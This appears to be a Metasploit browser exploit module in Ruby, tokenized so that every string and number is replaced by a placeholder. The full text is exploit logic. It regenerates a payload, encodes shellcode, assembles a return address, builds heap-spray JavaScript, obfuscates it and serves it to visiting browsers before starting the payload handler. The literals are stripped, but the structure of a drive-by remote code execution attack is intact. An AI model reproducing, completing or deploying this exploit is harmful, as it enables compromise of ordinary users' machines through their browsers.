require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <str> } ] ] , <str> = > <str> , <str> = > <int> ) ) end def autofilter false end def check_dependencies use_zlib end def on_request_uri ( cli , request ) return if ( ( p = regenerate_payload ( cli ) ) == nil ) fluff = rand_text_english ( rand ( <int> ) + <int> ) shellcode = Rex :: Text . to_unescape ( payload . encoded , Rex :: Arch . endian ( target . arch ) ) ret = Rex :: Text . uri_encode ( Metasm :: Shellcode . assemble ( Metasm :: Ia32 . new , <str> ) . encode_string * <int> ) js = <str> shellcode <str> js_heap_spray <str> ret <str> fluff <str> opts = { <str> = > true , <str> = > { <str> = > [ <str> , <str> , <str> , <str> , <str> , ] } } js = :: Rex :: Exploitation :: ObfuscateJS . new ( js , opts ) js . update_opts ( js_heap_spray . opts ) js . obfuscate ( ) content = <str> js <str> print_status ( <str> self . name <str> ) send_response_html ( cli , content ) handler ( cli ) end end 
